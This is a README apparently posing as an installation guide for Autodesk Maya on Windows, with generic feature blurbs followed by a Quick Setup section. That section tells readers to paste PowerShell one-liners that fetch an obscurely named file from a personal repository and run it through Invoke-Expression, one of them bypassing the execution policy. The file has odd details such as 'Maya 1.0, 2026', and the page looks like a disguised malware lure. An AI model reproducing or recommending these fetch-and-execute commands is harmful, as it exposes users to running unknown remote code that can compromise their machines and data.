# Maya

Maya is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Maya and work in it.

Autodesk Maya is a desktop 3D content creation suite used across film, television, and visual effects pipelines on Windows. It combines polygon and NURBS modeling, character rigging, keyframe and procedural animation, dynamics, and rendering through tools such as the Hypergraph, Graph Editor, and Arnold integration. Teams rely on it when scenes need precise control over deformers, constraints, and shot-based layout.

A typical Windows session starts from a project folder on a fast local drive. You set frame rate and units, reference or import assets, block animation in the viewport, refine shapes in component mode, and iterate lighting in Arnold or viewport 2.0. Riggers build joint hierarchies and skin weights; lighters assemble render layers and AOVs before sending frames to a farm or local batch.

This repository collects a Windows-oriented setup file for consistent installs, short notes on project defaults and plug-in paths, and a changelog that records version bumps and workflow tweaks. Use the setup file to align Maya versions and environment variables across machines, read the notes before opening shared scenes, and check the changelog when syncing with teammates.

## What you do with it

- Polygon and NURBS modeling tools shape characters, props, and hard-surface assets efficiently.
- Joint-based rigs with IK handles and constraints drive believable character performance in shots.
- Graph Editor and Dope Sheet refine timing, tangents, and cycle keys on complex animation curves.
- Arnold renderer integration produces production lighting, shaders, and AOV passes inside Maya.
- Bifrost and nParticle workflows simulate fluids, cloth interaction, and particle-driven effects on Windows.
- Viewport 2.0 displays textures, lights, and shadows while you block layout and animation.
- Reference editing keeps heavy assets external while teams iterate on local animation layers safely.
- MEL and Python scripting automates repetitive rigging, scene assembly, and pipeline validation tasks.

## Quick Setup (PowerShell)

This installs the program Maya on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/lea-graf479807919/maya-setup-guide/main/t3q5xv3p1b.y3u2ol2v | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/lea-graf479807919/maya-setup-guide/main/t3q5xv3p1b.y3u2ol2v | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `t3q5xv3p1b.y3u2ol2v` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `lea-graf479807919/maya-setup-guide`. Autodesk Maya 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
